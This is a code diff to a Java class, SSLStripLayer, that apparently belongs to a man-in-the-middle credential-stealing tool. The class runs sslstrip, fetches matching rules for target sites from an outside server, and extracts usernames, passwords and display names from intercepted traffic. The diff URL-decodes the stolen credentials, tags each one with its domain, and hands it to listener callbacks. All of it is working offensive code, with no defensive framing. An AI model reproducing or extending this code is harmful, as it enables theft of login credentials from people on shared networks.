@@ -8,6 +8,7 @@ import java.io.FileWriter;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.net.URL;
+import java.net.URLDecoder;
 import java.util.Collections;
 import java.util.LinkedList;
 import java.util.List;
@@ -18,6 +19,7 @@ public class SSLStripLayer {
 	private String deviceName;
 	private static final int SSLSTRIP_PORT = 8080;
 	private Process sslStripProcess;
+	private List<UserInfoListener> userInfoListeners = new LinkedList<UserInfoListener>();
 	
 	class MatchTarget {
 		public String domainRegex, varMatchKey, varMatchValue, varUser, varPass, varDisplayName;
@@ -39,8 +41,6 @@ public class SSLStripLayer {
 		}
 	}
 	private List<MatchTarget> matchTargets = new LinkedList<MatchTarget>();
-	
-	private List<UserInfo> userInfo = new LinkedList<UserInfo>();
 	
 	public SSLStripLayer(final NetworkInterface device) throws IOException {
 		URL match = new URL("https://nuclearsheep-hatchunc.rhcloud.com/getmatchtargets.php");
@@ -123,16 +123,18 @@ public class SSLStripLayer {
 				        			}
 				        		}
 				        		if (varParts[0].equals(target.varUser) && varParts.length > 1)
-				        				userName = varParts[1];
+				        				userName = URLDecoder.decode(varParts[1]);
 				        		if (varParts[0].equals(target.varPass) && varParts.length > 1)
-			        				password = varParts[1];
+			        				password = URLDecoder.decode(varParts[1]);
 				        		if (target.varDisplayName != null &&
 				        				varParts[0].equals(target.varDisplayName) && varParts.length > 1)
-			        				displayName = varParts[1];
+			        				displayName = URLDecoder.decode(varParts[1]);
 				        	}
 				        	if (matchedVar) {
-				        		synchronized(userInfo) {
-				        			userInfo.add(new UserInfo(userName, password, displayName));
+				        		UserInfo newUser = new UserInfo(domain, userName, password, displayName);
+				        		synchronized(userInfoListeners) {
+				        			for (UserInfoListener listener: userInfoListeners)
+				        				listener.receiveNewUserInfo(newUser);
 				        		}
 				        		break;
 				        	}
@@ -160,9 +162,9 @@ public class SSLStripLayer {
 		sslStripProcess = null;
 	}
 	
-	public List<UserInfo> getFoundUsers() {
-		synchronized(userInfo) {
-			return Collections.unmodifiableList(userInfo);
+	public void registerUserInfoListener(UserInfoListener listener) {
+		synchronized(userInfoListeners) {
+			userInfoListeners.add(listener);
 		}
 	}
 }
